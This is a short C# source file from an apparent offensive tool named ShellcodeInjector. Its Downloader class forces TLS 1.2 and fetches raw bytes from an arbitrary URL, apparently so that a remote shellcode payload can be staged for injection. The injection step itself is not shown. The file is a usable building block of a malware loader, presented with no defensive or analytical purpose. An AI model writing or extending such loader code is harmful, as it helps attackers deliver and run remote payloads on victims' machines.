using System.Net;

namespace ShellcodeInjector
{
    internal static class Downloader
    {
        internal static byte[] DownloadFromUrl(string url)
        {
            try
            {
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            }
            catch { }

            WebClient client = new WebClient();
            return client.DownloadData(url);
        }
    }
}
